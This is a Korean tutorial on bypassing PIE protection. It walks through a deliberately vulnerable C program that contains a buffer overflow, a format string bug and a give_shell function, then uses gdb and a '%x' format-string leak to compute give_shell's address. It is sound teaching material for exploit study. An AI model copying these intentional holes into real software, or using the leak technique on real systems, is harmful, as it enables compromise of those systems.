Bypassing PIE :
    PIE 보호기법을 우회하기 위해서는 코드 영역의 주소를 알아내야 합니다.  

    PIE 보호기법이 설정되어 있을 때 코드 영역은 공유 라이브러리처럼 메모리에 로딩되기 때문에
    libc.so.6 라이브러리 주소를 구하는 과정과 같이 특정 코드 영역의 주소를 알아낸다면 코드 영역 베이스 주소를 구할 수 있습니다.
    코드 영역 베이스 주소를 구한다면, 오프셋 계산을 통해 코드나 데이터 영역의 주소를 구할 수 있습니다.

    PIE 보호기법을 설정한 example8을 통해 PIE 보호기법에 대한 익스플로잇을 실습해 보도록 하겠습니다.
    ex)
        // gcc -o example8 example8.c -m32 -fno-stack-protector -mpreferred-stack-boundary=2 -fPIC -pie
        #include <stdio.h>
        void give_shell(void){
            system("/bin/sh");
        }
        void vuln(void){
            char buf[32] = {};
            printf("Input1 > ");
            read(0, buf, 512);    // Buffer Overflow
            printf(buf);          // Format String Bug
            printf("Input2 > ");
            read(0, buf, 512);    // Buffer Overflow
        }
        int main(void){
            setvbuf(stdin, NULL, _IONBF, 0);
            setvbuf(stdout, NULL, _IONBF, 0);
            vuln();
        }

    ex)
        $ gdb -q ./example8
        Reading symbols from ./example8...(no debugging symbols found)...done.
        (gdb) disas vuln
        Dump of assembler code for function vuln:
            0x000006f5 <+0>:	push   ebp
            0x000006f6 <+1>:	mov    ebp,esp
            0x000006f8 <+3>:	push   ebx
            0x000006f9 <+4>:	sub    esp,0x20

    gdb로 vuln 함수를 디스어셈블 했을 때 주소가 오프셋 형태로 출력되는 것을 확인할 수 있습니다.

    example8.c에는 두 종류의 취약점이 존재합니다. 
    첫 번째는 line 13, line 18에 존재하는 스택 버퍼 오버플로우 취약점이고, 두 번째는 line 15에 존재하는 포맷 스트링 버그 취약점입니다.

    바이너리에는 셸을 실행시켜주는 give_shell 함수가 있습니다.
    우선 포맷 스트링 버그를 이용해 give_shell 함수의 주소를 구한 후,
    스택 버퍼 오버플로우 취약점으로 리턴 주소를 give_shell 함수의 주소로 덮어 셸을 실행해보도록 하겠습니다.

    우선 printf(buf)를 실행하는 시점에 브레이크포인트를 설정해 스택 메모리를 살펴보도록 하겠습니다.
    ex) printf 가 호출되는 시점의 스택 메모리
        $ gdb -q ./example8
        Reading symbols from ./example8...(no debugging symbols found)...done.
        (gdb) start
        Temporary breakpoint 1 at 0x780
        Starting program: ~/example8 
        Temporary breakpoint 1, 0x56555780 in main ()
        (gdb) disas vuln
        Dump of assembler code for function vuln:
        ...
            0x00000745 <+80>:	add    esp,0xc
            0x00000748 <+83>:	lea    eax,[ebp-0x24]
            0x0000074b <+86>:	push   eax
            0x0000074c <+87>:	call   0x510 <printf@plt>
        ...
        End of assembler dump.
        (gdb) b *0x5655574c
        Breakpoint 2 at 0x5655574c
        (gdb) c
        Continuing.
        Input1 > aaaabbbbcccc
        Breakpoint 2, 0x5655574c in vuln ()
        (gdb) x/40wx $esp
        0xffffd524:	0xffffd528	0x61616161	0x62626262	0x63636363
        0xffffd534:	0x0000000a	0x00000000	0x00000000	0x00000000
        0xffffd544:	0x00000000	0x56557000	0xffffd558	0x565557be
        0xffffd554:	0x00000000	0x00000000	0xf7e19637	0x00000001
        0xffffd564:	0xffffd5f4	0xffffd5fc	0x00000000	0x00000000
        0xffffd574:	0x00000000	0xf7fb3000	0xf7ffdc04	0xf7ffd000
        0xffffd584:	0x00000000	0xf7fb3000	0xf7fb3000	0x00000000
        0xffffd594:	0xb988c975	0x8509e765	0x00000000	0x00000000
        0xffffd5a4:	0x00000000	0x00000001	0x56555560	0x00000000
        0xffffd5b4:	0xf7fee010	0xf7fe8880	0x56557000	0x00000001
        (gdb) x/s 0xffffd528
        0xffffd528:	"aaaabbbbcccc\n"
        (gdb)

    오른쪽 디버깅 화면에서 x/40wx $esp 로 출력된 메모리는 printf(buf)를 실행하는 시점의 스택 메모리입니다. 
    스택 메모리를 보면, 0xffffd550에 바이너리 코드 영역의 주소인 0x565557be이 저장되어 있는 것을 볼 수 있습니다.

    gdb로 확인해 본 결과 0x565557be는 vuln 함수의 리턴 주소, 즉 main+66의 주소인 것을 알 수 있습니다.

    바이너리 코드 영역의 주소를 구해 give_shell 주소를 계산하는 것이 목표이기 때문에 
    포맷 스트링 버그를 이용해 0xffffd550에 있는 값을 출력시켜 보도록 하겠습니다. 
    0x61616161이 저장되어 있는 0xffffd528이 첫 번째 포맷 스트링에 대한 인자 위치이므로 11번째 포맷에서 스택에 저장된 0x565557be를 출력시킬 수 있습니다.
    ex)
        Input1 > %x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x
        255f7825_78255f78_5f78255f_255f7825_78255f78_5f78255f_255f7825_78255f78_5655700a_ffffd558_565557be

    11번째 "%x"에 대한 결과로 565557be가 출력되어 바이너리의 코드 주소를 알아내었습니다.
    이 주소를 이용해 give_shell의 주소를 계산해 보겠습니다.
    ex)
        (gdb) p give_shell
        $1 = {<text variable, no debug info>} 0x565556d0 <give_shell>
        (gdb) p/x 0x565557be - 0x565556d0
        $2 = 0xee
        (gdb) 

    give_shell 함수의 주소는 0x565557be - 0xee인 것을 확인하였습니다.
























